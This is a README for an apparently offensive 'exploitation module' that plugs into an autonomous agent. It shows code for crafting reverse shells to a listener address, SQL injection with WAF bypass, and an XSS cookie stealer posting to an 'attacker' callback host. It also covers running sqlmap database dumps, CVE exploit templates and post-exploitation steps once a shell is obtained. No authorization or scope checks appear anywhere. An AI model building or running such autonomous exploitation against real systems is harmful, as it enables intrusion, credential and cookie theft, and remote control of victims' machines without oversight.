# Optimus Exploitation Module - Phase 1

## Overview

This module transforms Optimus from a **tool runner** into an **exploit generator** by providing:

| Component | Description |
|-----------|-------------|
| **ExploitDatabase** | 24 exploit templates mapping CVEs & vuln types to commands |
| **PayloadCrafter** | Generates shells, SQLi, XSS, LFI payloads with WAF bypass |
| **ExploitExecutor** | Safe execution with validation & result parsing |
| **ExploitationManager** | High-level integration with autonomous_agent.py |

## Installation

```bash
# Extract into your Optimus backend directory
cd Optimus/backend
unzip optimus_exploitation_module.zip

# Verify
python -c "from exploitation import get_exploit_database; print('OK:', len(get_exploit_database().templates), 'templates')"

# Run tests
python -m exploitation.test_exploitation
```

## Integration with autonomous_agent.py

### Step 1: Add imports (after existing imports ~line 25)
```python
try:
    from exploitation.integration import ExploitationManager, get_post_exploitation_commands
    EXPLOITATION_MODULE_AVAILABLE = True
except ImportError:
    EXPLOITATION_MODULE_AVAILABLE = False
```

### Step 2: Initialize in __init__ (after self.learning_module ~line 54)
```python
self.exploitation_manager = None
if EXPLOITATION_MODULE_AVAILABLE:
    self.exploitation_manager = ExploitationManager(self.tool_manager)
    print("[Agent] ExploitationManager initialized")
```

### Step 3: Use during exploitation phase
```python
# Get exploit for a finding
result = await self.exploitation_manager.exploit_finding(finding, {
    'target': scan_state['target'],
    'lhost': '10.10.14.1',
    'lport': 4444
})

if result.shell_obtained:
    # Run post-exploitation
    commands = get_post_exploitation_commands('linux', 'enumerate')
```

## Quick Usage Examples

### Exploit Database
```python
from exploitation import get_exploit_database

db = get_exploit_database()

# By CVE
templates = db.get_by_cve("CVE-2021-44228")  # Log4Shell

# By service  
wp_exploits = db.get_by_service("wordpress")

# For a finding
match = db.get_exploit_for_finding(
    {'type': 'sql_injection'},
    {'target': 'http://vuln.com/page?id=1'}
)
template, command = match
print(command)  # sqlmap -u '...' --batch --dbs
```

### Payload Crafter
```python
from exploitation import get_payload_crafter, ShellType

crafter = get_payload_crafter()

# Reverse shells (12 types)
shell = crafter.craft_reverse_shell(ShellType.BASH, "10.10.14.1", 4444)

# SQLi with WAF bypass
sqli = crafter.craft_sqli("union_basic", columns=5, waf_bypass=True)

# XSS cookie stealer
xss = crafter.craft_xss("steal_cookie_fetch", callback="http://attacker/steal")

# All auth bypass payloads
bypasses = crafter.craft_sqli_auth_bypass(waf_bypass=True)
```

### Exploit Executor
```python
from exploitation import get_exploit_executor

executor = get_exploit_executor(tool_manager)

result = await executor.execute_command(
    command="sqlmap -u 'http://target/page?id=1' --batch --dbs",
    exploit_id="sqli_test",
    success_indicators=["available databases"],
    timeout=300
)

print(f"Status: {result.status.value}")
print(f"Shell: {result.shell_obtained}")
print(f"Creds: {result.credentials_found}")
print(f"Data: {result.extracted_data}")
```

## Exploit Templates Included

| Category | Count | Examples |
|----------|-------|----------|
| SQL Injection | 4 | UNION, Boolean Blind, Time-based, Dump All |
| XSS | 3 | Reflected, DOM, Cookie Stealing |
| Command Injection | 2 | Basic, Reverse Shell |
| File Inclusion | 2 | LFI, Log Poisoning |
| Authentication | 3 | HTTP Basic, Form, SSH brute force |
| Known CVEs | 6 | Log4Shell, Struts, BlueKeep, Apache Path Traversal |
| WordPress | 2 | XML-RPC, Plugin Vulns |
| Privilege Escalation | 2 | Linux/Windows enumeration |

## Payload Types

- **Reverse Shells**: bash, sh, python, python3, perl, php, ruby, nc, nc_mkfifo, powershell, awk, lua, nodejs
- **SQL Injection**: UNION, error-based, boolean blind, time-based, auth bypass, stacked queries
- **XSS**: script, img, svg, event handlers, cookie stealing, keylogger, DOM, polyglots
- **Command Injection**: semicolon, pipe, ampersand, backtick, subshell, blind variants
- **LFI**: path traversal, null byte, PHP wrappers, log poisoning

## WAF Bypass Techniques

- Case variation (`SeLeCt`)
- Comment insertion (`/**/`)
- URL encoding (single & double)
- Unicode encoding
- HTML entity encoding
- Null byte insertion

## Files

```
backend/exploitation/
├── __init__.py              # Exports
├── exploit_db.py            # ExploitDatabase + ExploitTemplate
├── payload_crafter.py       # PayloadCrafter
├── exploit_executor.py      # ExploitExecutor + ExploitResult
├── integration.py           # ExploitationManager
├── INTEGRATION_PATCH.py     # Full patching instructions
├── test_exploitation.py     # Test suite (5 tests)
├── README.md                # This file
└── data/
    └── exploit_templates.json
```

## Test Results

```
============================================================
TEST SUMMARY
============================================================
  [PASS] Exploit Database
  [PASS] Payload Crafter  
  [PASS] Exploit Executor
  [PASS] Integration
  [PASS] Async Execution

Total: 5 passed, 0 failed
```
